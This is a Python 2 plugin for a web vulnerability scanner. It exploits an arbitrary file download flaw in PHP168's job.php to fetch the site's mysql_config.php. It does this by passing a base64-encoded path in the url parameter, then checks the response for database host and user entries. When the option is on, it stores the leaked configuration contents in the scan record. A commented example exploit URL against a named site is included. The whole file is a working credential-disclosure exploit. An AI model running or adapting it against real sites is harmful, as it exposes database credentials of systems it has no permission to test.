#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import base64
def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail =""
       
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        baseurl="%s%s"%(url,"php168/mysql_config.php")
        #http://dabei.org//job.php?job=download&url="aHR0cDovL2RhYmVpLm9yZy8vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLnBocA=="\
        #http://dabei.org//
        expurl ="%s" "/job.php?job=download&url=\"%s\""%(url,base64.b64encode(baseurl))
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        print content
        if res['status'] == '200' and content.find('$dbhost')>=0 and content.find("dbuser")>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            if ob['isstart']=='1':
                content=content.decode("gbk").encode("utf-8")
                detail="%s\n验证性扫描结果：\n%s"%(detail,content)
                
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:php169downloadscirpt.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:php169downloadscirpt.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def